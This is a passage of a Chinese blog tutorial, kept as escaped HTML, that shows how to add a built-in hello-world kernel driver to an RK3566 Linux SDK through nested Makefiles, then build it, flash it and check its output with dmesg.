src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173751023-892940144.png\" /></p>\n<h2 id=\"makefile文件的编写\">Makefile文件的编写</h2>\n<blockquote>\n<p>主要注意Makefile文件的编写（路径，包含）</p>\n<p>在该路径下先新建一个用户内核驱动文件夹，用于存放用户编写的驱动</p>\n<p><strong>user_rk3566_-kernel-driver</strong></p>\n<p>进入该文件夹，新建一个02序号用户驱动文件夹，用于存放02驱动</p>\n<p><strong>02_kernel_helloworld</strong></p>\n<p>编写kernel/drivers/user_rk3566_-kernel-driver/02_kernel_helloworld路径下的Makefile（添加驱动源文件<strong>02_kernel_helloworld.c</strong>进编译）</p>\n<pre><code>vim Makefile\n</code></pre>\n<p>Makefile：</p>\n<pre><code>#obj-y :内核驱动\n#obj-m :模块驱动\nobj-y += 02_hello_world.o\n</code></pre>\n<p>返回到<strong>kernel/drivers/user_rk3566_-kernel-driver</strong>路径，添加Makefile（添加驱动源文件的文件夹<strong>02_kernel_helloworld/</strong>进编译）</p>\n<p>Makefile：</p>\n<pre><code>#添加驱动文件所在文件夹进编译，需要带“/”符号，表示目录（文件夹）\nobj-y += 02_kernel_helloworld/\n</code></pre>\n<p>返回到<strong>kernel/drivers</strong>路径，添加Makefile（添加驱动源文件的文件夹user_rk3566_-kernel-driver/进编译）</p>\n<p>Makefile：</p>\n<pre><code>obj-y +=/user_rk3566_-kernel-driver/\n</code></pre>\n<p>随便找个地方，把文件夹路径丢进去</p>\n</blockquote>\n<img alt=\"image-20260118171936747\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173754308-308553245.png\" />\n<blockquote>\n<p>OK,由于SDK路径的Makefile文件已经将kernel/drivers路径添加，我们就不需要自己手动添加</p>\n<p>以上就是所需要添加的Makefile文件。</p>\n<p>主要目的是告诉make工具在<strong>kernel/drivers/user_rk3566_-kernel-driver/02_kernel_helloworld</strong>路径下是我们的驱动源代码<strong>02_kernel_helloworld.c</strong>，需要添加进编译</p>\n</blockquote>\n<h2 id=\"驱动文件编写\">驱动文件编写</h2>\n<blockquote>\n<p>进入该02_kernel_helloworld，开始驱动编写</p>\n<pre><code>vim 02_hello_world.c \n</code></pre>\n<p>02_hello_world.c</p>\n<pre><code class=\"language-c\">#include &lt;linux/module.h&gt;     /* 模块相关宏和函数 */\n#include &lt;linux/kernel.h&gt;     /* printk日志函数 */\n\n/* 加载函数（驱动入口），当驱动被 insmod 加载时自动执行 */\nstatic int __init helloworld_init(void)\n{\n    printk(\"02_helloworld_init\\r\\n\"); // 内核日志打印\n    return 0; // 返回0代表加载成功\n}\n\n/* 卸载函数（驱动出口），当驱动被 rmmod 卸载时自动执行 */\nstatic void __exit helloworld_exit(void)\n{\n    printk(\"02_helloworld_exit\\r\\n\");\n}\n\n/* 下面这两行，告诉内核入口和出口分别是哪两个函数 */\nmodule_init(helloworld_init);\nmodule_exit(helloworld_exit);\n\n/* 这3个是模块信息声明 */\nMODULE_LICENSE(\"GPL v2\");               /* 模块许可证 */\n\n</code></pre>\n</blockquote>\n<h2 id=\"编译\">编译</h2>\n<p>我们需要返回到kernel内核文件夹的上一个路径</p>\n<p>在我这是SDK/，这里包含了编译脚本，须在这里运行编译命令</p>\n<pre><code>./build.sh kernel\n</code></pre>\n<p><img alt=\"image-20260118172404378\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173751745-1600325666.png\" /></p>\n<p>编译成功</p>\n<p><img alt=\"image-20260118172442489\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173752421-1683639729.png\" /></p>\n<p>返回源代码路径查看编译文件（可选）</p>\n<p><img alt=\"image-20260118163216910\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173752940-2085711302.png\" /></p>\n<p>可以看到，内核驱动编译后，不会像模块驱动那样生成<strong>.ko</strong>文件</p>\n<p>实际，驱动相关的内容已经编译进内核镜像中（root.img）</p>\n<p><img alt=\"image-20260118172723586\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173753283-1927509773.png\" /></p>\n<h2 id=\"运行\">运行</h2>\n<p>将该镜像烧录，等板子运行后查看日志</p>\n<pre><code>dmesg | grep -E hello\n</code></pre>\n<p><img alt=\"image-20260118173111518\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173753691-118600053.png\" /></p>\n<p>可以看到驱动上电后自动运行，这就是和模块驱动的一个显著区别，不需要手动挂载</p>\n<p>修改完后，git提交一下代码更改（可选）</p>\n<pre><code>git add .\ngit commit -m\"修改说明\"\ngit pull\ngit push\n</code></pre>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 17:40</span>&nbsp;\n<a href=\"https://www.cnblogs.com/tianwuyvlianshui\">沁拒离</a>&nbsp;\n阅读(<span id=\"post_view_count\">35</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}